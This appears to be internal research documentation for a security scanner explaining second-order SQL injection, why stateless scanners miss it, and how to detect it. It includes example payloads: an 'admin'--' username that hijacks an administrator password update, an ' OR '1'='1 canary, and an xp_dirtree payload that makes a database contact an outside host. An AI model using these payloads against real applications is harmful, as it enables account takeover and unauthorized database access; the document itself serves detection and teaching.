# Second-Order & Stored SQL Injection: Workflows & State Tracking

**Document Identifier:** SENTINEL-RES-2ND-07  
**Classification:** Stateful Workflow & Cross-Endpoint Dependency Analysis  

---

## 1. Anatomy of Second-Order SQL Injection

Second-Order SQL Injection occurs when untrusted input is safely stored in the database in one operation (often via parameterized queries), and subsequently retrieved and unsafely concatenated into a dynamic SQL query during a separate, downstream application workflow.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ STAGE 1: INGRESS & STORAGE                                                  │
│ User submits payload to Endpoint A:                                         │
│   POST /register { "username": "admin'--" }                                 │
│ Application executes parameterized INSERT:                                  │
│   INSERT INTO users (username) VALUES (?)  <-- (Safe parameterization)     │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
                                       ▼ Database stores raw: "admin'--"
┌─────────────────────────────────────────────────────────────────────────────┐
│ STAGE 2: RETRIEVAL & UNSAFE EXECUTION                                       │
│ User triggers secondary workflow on Endpoint B:                             │
│   POST /change-password { "new_pass": "secret" }                            │
│ Application retrieves stored username and constructs raw dynamic SQL:       │
│   UPDATE users SET pass = 'secret' WHERE username = 'admin'--'              │
│ Execution breaks out of quotes and updates the administrator's password!    │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Why Conventional DAST Scanners Fail

Standard single-request scanners operate under a stateless request-response model:
1. They send a probe to `POST /register`.
2. They inspect the immediate response (`HTTP 200 Registration Successful`).
3. Because the immediate response contains no SQL error and no differential output, the scanner flags the endpoint as **SAFE** (False Negative).
4. The scanner never triggers `POST /change-password` or `GET /profile` to observe the downstream execution.

---

## 3. Workflow Dependency Graphs

To detect second-order vulnerabilities, an investigation engine must model multi-step directed state transitions:

```
[ Ingress Endpoint ] ──────── Stores In DB ────────► [ Execution Endpoint ]
  POST /api/users/profile                               GET /admin/audit-logs
  POST /api/support/tickets                             GET /api/reports/summary
  POST /api/billing/cards                               POST /api/invoices/generate
  PUT  /api/settings/organization                       GET /api/dashboard/metrics
```

---

## 4. Detection & Correlation Strategies

1. **Stateful Sequence Execution**:
   - Step A: Inject traceable canary token (`snt_user_' OR '1'='1`) into candidate write endpoint.
   - Step B: Execute dependent read/admin endpoints in the sequence graph.
   - Step C: Check for canary reflection or structural divergence in Endpoint B.
2. **Out-of-Band (OAST) Correlation**:
   - Inject unique OAST DNS payload (`'; EXEC xp_dirtree '\\token.gateway.domain\a'--`).
   - If a background cron job or administrative report executes hours later, the gateway logs the DNS lookup with the associated session ID, tracing the root cause back to the original ingress endpoint.
